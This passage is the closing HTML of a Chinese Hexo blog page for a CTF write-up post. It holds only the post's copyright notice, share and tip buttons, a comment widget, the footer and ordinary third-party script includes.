+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:bi0x@foxmail.com">Bi0x</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.bi0x.cn/2020/04/19/wp-hfctf2020/">http://www.bi0x.cn/2020/04/19/wp-hfctf2020/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.bi0x.cn" target="_blank">Bi0x</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WP/">WP    </a></div><div class="post_share"><div class="social-share" data-image="/images/pasted-38.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付宝"/><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2020/04/14/wp1/"><img class="next_cover lazyload" data-src="/images/pasted-38.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">0x01 - 做题记录 (1)</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/04/14/wp1/" title="0x01 - 做题记录 (1)"><img class="relatedPosts_cover lazyload"data-src="/images/pasted-38.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-04-14</div><div class="relatedPosts_title">0x01 - 做题记录 (1)</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+
+window.valine = new Valine({
+  el:'#vcomment',
+  notify: false,
+  verify: false,
+  appId: 'J91TT6tmiySm3lUixVOE4CbJ-gzGzoHsz',
+  appKey: 'MidtPXnwEq70NCNqga98erKe',
+  placeholder: 'Please leave your footprints',
+  avatar: 'monsterid',
+  meta: guest_info,
+  pageSize: '10',
+  lang: 'zh-cn',
+  recordIP: false,
+  serverURLs: ''
+});</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Bi0x</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">到这里结束了呢</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+    processEscapes: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  CommonHTML: {
+    linebreaks: { automatic: true, width: "90% container" }
+  },
+  "HTML-CSS": { 
+    linebreaks: { automatic: true, width: "90% container" }
+  },
+  "SVG": { 
+    linebreaks: { automatic: true, width: "90% container" }
+  }
+});
+</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
+  var all = MathJax.Hub.getAllJax(), i;
+  for (i=0; i < all.length; i += 1) {
+    all[i].SourceElement().parentNode.className += ' has-jax';
+  }
+});
+</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/click_heart.js"></script><script>if (document.getElementsByClassName('mermaid').length) {
+  loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js',function () {
+    mermaid.initialize({
+      theme: 'default',
+  })
+})
+}</script></body></html>
